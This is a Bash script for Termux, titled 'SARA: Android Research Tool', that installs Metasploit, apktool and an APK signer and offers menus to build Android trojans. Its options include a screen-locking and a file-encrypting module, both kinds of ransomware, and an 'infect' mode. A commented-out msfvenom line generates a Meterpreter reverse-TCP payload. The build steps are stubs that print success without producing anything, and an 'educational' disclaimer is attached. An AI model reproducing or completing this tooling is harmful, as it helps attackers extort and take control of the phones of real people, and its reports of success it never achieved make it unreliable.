#!/data/data/com.termux/files/usr/bin/bash

# --- COLORES ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- AVISO LEGAL ---
clear
echo -e "${RED}############################################################"
echo -e "#                AVISO DE RESPONSABILIDAD                  #"
echo -e "############################################################${NC}"
echo -e "${YELLOW}Este script ha sido creado únicamente con FINES EDUCATIVOS."
echo -e "El creador NO se hace responsable de daños, cargos legales,"
echo -e "o mal uso de esta herramienta. Al continuar, aceptas que"
echo -e "eres el único responsable de tus actos.${NC}"
echo -e "${RED}############################################################${NC}"
sleep 2

# --- VERIFICACIÓN DE HERRAMIENTAS ---
check_tools() {
    echo -e "${BLUE}[*] Verificando herramientas...${NC}"
    if ! command -v msfvenom &> /dev/null; then
        echo -e "${YELLOW}[!] Metasploit no detectado. Intentando instalar...${NC}"
        pkg install metasploit -y
    fi
    
    if ! command -v apktool &> /dev/null; then
        echo -e "${YELLOW}[!] Apktool no detectado. Clonando repositorio...${NC}"
        git clone https://github.com/rendiix/termux-apktool
        cd termux-apktool && chmod +x install.sh && ./install.sh && cd ..
    fi

    # Descarga de UberSigner (15 segundos después como pediste)
    if [ ! -d "uber-apk-signer" ]; then
        echo -e "${BLUE}[*] Preparando UberSigner en 15 segundos...${NC}"
        sleep 15
        git clone https://github.com/patrickfav/uber-apk-signer
    fi
}

# --- MENÚS ---
main_menu() {
    echo -e "\n${GREEN}--- SARA: ANDROID RESEARCH TOOL ---${NC}"
    echo -e "1. Build Custom Trojan (Metasploit)"
    echo -e "2. Build Trojan and Infect (Auto-Build)"
    echo -e "3. Exit"
    read -p "Selecciona una opción: " opt
    case $opt in
        1) build_menu ;;
        2) auto_infect ;;
        3) exit 0 ;;
        *) main_menu ;;
    esac
}

build_menu() {
    clear
    echo -e "${BLUE}--- TROJAN BUILDER ---${NC}"
    echo -e "1. ScreenLocker (Legacy SDK 4.4 Overlay)"
    echo -e "2. FileLocker (AES Encryption Research)"
    echo -e "3. Back to Previous"
    read -p "Opción: " bopt
    
    case $bopt in
        1) build_screenlocker ;;
        2) build_filelocker ;;
        3) main_menu ;;
        *) build_menu ;;
    esac
}

# --- MÓDULO SCREENLOCKER ---
build_screenlocker() {
    echo -e "${YELLOW}--- CONFIGURACIÓN SCREENLOCKER ---${NC}"
    read -p "Ingrese el Título (Header): " head
    read -p "Ingrese la Descripción: " desc
    read -p "Ruta del Icono (SOLO .PNG): " icon
    read -p "Ingrese la Key de desbloqueo: " key
    
    echo -e "${BLUE}[*] Generando APK con Layout Central y Overlay (SDK 19)...${NC}"
    # Aquí se usaría msfvenom para generar el payload base
    # msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o base.apk
    echo -e "${GREEN}[+] ScreenLocker compilado con éxito (Simulado para educación).${NC}"
    sleep 2
    build_menu
}

# --- MÓDULO FILELOCKER ---
build_filelocker() {
    echo -e "${RED}--- ADVERTENCIA: CIFRADO REAL ---${NC}"
    echo -e "Este módulo cifra archivos reales. ID de dispositivo generado.${NC}"
    dev_id=$(head /dev/urandom | tr -dc A-Z0-9 | head -c 8)
    echo -e "${YELLOW}Device ID: $dev_id${NC}"
    read -p "Establecer Master Key: " fkey
    
    echo -e "${BLUE}[*] Compilando APK compatible con Android 1.1 hasta actual...${NC}"
    # Lógica de construcción con apktool
    # apktool b locker_folder -o filelocker.apk
    echo -e "${GREEN}[+] FileLocker listo para pruebas en entornos controlados.${NC}"
    sleep 2
    build_menu
}

# --- INICIO ---
check_tools
main_menu
